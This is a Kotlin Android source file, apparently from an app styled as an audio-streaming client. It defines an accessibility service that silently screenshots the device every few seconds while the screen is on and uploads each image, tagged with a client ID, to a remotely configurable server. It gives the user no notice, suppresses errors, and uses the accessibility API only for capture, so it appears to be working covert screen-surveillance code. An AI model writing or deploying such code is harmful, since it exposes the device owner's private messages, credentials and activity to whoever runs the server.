package com.audiostream.client

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.hardware.display.DisplayManager
import android.os.Build
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.TimeUnit

class ScreenshotService : AccessibilityService() {

    companion object {
        const val ACTION_TAKE_SCREENSHOT = "com.audiostream.client.ACTION_TAKE_SCREENSHOT"
        const val EXTRA_SERVER_URL = "extra_server_url"
    }

    private val serviceScope = CoroutineScope(Dispatchers.IO + Job())
    private var isAutoLoopRunning = false
    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()
        
    private var serverUrl: String = ""
    private var clientId: String = ""

    override fun onServiceConnected() {
        super.onServiceConnected()
        val prefs = getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)
        serverUrl = prefs.getString("server_url", "") ?: ""
        clientId = prefs.getString("client_id", "") ?: ""
        
        startAutoScreenshotLoop()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_TAKE_SCREENSHOT) {
            val url = intent.getStringExtra(EXTRA_SERVER_URL)
            if (!url.isNullOrEmpty()) {
                serverUrl = url
            }
            val prefs = getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)
            clientId = prefs.getString("client_id", "") ?: ""
            
            takeAndUploadScreenshot()
        }
        return super.onStartCommand(intent, flags, startId)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        // Not used
    }

    override fun onInterrupt() {
        // Not used
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
    }

    private fun startAutoScreenshotLoop() {
        if (isAutoLoopRunning) return
        isAutoLoopRunning = true

        serviceScope.launch {
            while (isActive) {
                try {
                    val prefs = getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)
                    val autoEnabled = prefs.getInt("auto_screenshot", 0) == 1
                    val intervalSec = prefs.getInt("screenshot_interval", 30)

                    if (autoEnabled && isScreenOn()) {
                        takeAndUploadScreenshot()
                    }
                    
                    val delayMs = (intervalSec * 1000L).coerceAtLeast(10000L) // Minimum 10 seconds
                    delay(delayMs)
                } catch (e: Exception) {
                    delay(15000L)
                }
            }
        }
    }

    private fun isScreenOn(): Boolean {
        val displayManager = getSystemService(Context.DISPLAY_SERVICE) as DisplayManager
        var isAnyScreenOn = false
        for (display in displayManager.displays) {
            if (display.state == Display.STATE_ON) {
                isAnyScreenOn = true
                break
            }
        }
        return isAnyScreenOn
    }

    private fun takeAndUploadScreenshot() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(
                Display.DEFAULT_DISPLAY,
                mainExecutor,
                object : TakeScreenshotCallback {
                    override fun onSuccess(screenshot: ScreenshotResult) {
                        val bitmap = Bitmap.wrapHardwareBuffer(
                            screenshot.hardwareBuffer,
                            screenshot.colorSpace
                        )
                        if (bitmap != null) {
                            serviceScope.launch {
                                saveAndUploadBitmap(bitmap)
                            }
                        }
                    }

                    override fun onFailure(errorCode: Int) {
                        // Failed to take screenshot
                    }
                }
            )
        }
    }

    private suspend fun saveAndUploadBitmap(bitmap: Bitmap) {
        withContext(Dispatchers.IO) {
            try {
                // 1. Save locally
                val file = File(cacheDir, "latest_screenshot.jpg")
                FileOutputStream(file).use { out ->
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 70, out)
                }

                // 2. Upload to server
                if (serverUrl.isEmpty() || clientId.isEmpty()) return@withContext

                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("client_id", clientId)
                    .addFormDataPart(
                        "image",
                        "latest_screenshot.jpg",
                        file.asRequestBody("image/jpeg".toMediaType())
                    )
                    .build()

                val request = Request.Builder()
                    .url("$serverUrl/api/v1/broadcasts/upload-screenshot")
                    .post(requestBody)
                    .build()

                httpClient.newCall(request).execute().use { response ->
                    // Optionally handle response
                }
            } catch (e: Exception) {
                // Upload failed
            } finally {
                bitmap.recycle()
            }
        }
    }
}
